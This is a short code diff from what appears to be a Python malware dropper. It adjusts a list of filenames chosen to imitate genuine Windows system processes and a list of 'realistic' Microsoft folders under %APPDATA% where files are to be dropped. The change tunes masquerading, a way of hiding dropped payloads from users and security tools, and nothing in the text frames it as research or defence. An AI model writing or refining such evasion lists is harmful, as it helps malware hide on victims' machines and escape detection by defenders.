@@ -18,17 +18,17 @@ import time
 # Legitimate-looking drop filenames
 DROP_NAMES = [
     "RuntimeBroker", "SearchIndexer", "SecurityHealthService",
-    "WmiPrvSE", "CompatTelRunner", "MpCmdRun", "dllhost",
-    "conhost", "sihost", "taskhostw", "ctfmon", "fontdrvhost",
+    "WmiPrvSE", "CompatTelRunner",
+    "sihost", "taskhostw", "ctfmon", "fontdrvhost",
     "WUDFHost", "DeviceCensus", "MusNotification",
 ]
 
 # Realistic subdirs under %APPDATA%
 DROP_SUBDIRS = [
     ("Microsoft", "Windows", "Themes"),
-    ("Microsoft", "Windows", "Shell"),
     ("Microsoft", "Network"),
     ("Microsoft", "Crypto"),
+    ("Microsoft", "Windows", "TextInput"),
 ]
 
 # ============================================================
